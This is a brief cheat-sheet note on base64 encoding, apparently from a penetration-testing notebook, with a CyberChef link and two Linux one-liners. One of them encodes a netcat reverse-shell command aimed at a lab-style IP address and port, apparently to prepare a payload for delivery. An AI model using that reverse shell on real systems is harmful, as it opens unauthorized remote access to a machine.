---
publish: true
created: 2026-10-03T08:40:24.740Z
modified: 2026-10-03T08:40:24.740Z
---

## base64

Use [Cyberchef](https://gchq.github.io/CyberChef/).
or using linux as below.

```
echo -n "Your text here" | iconv -t UTF-16LE | base64
echo nc -e /bin/bash 10.10.14.7 443 | base64 -w0
```
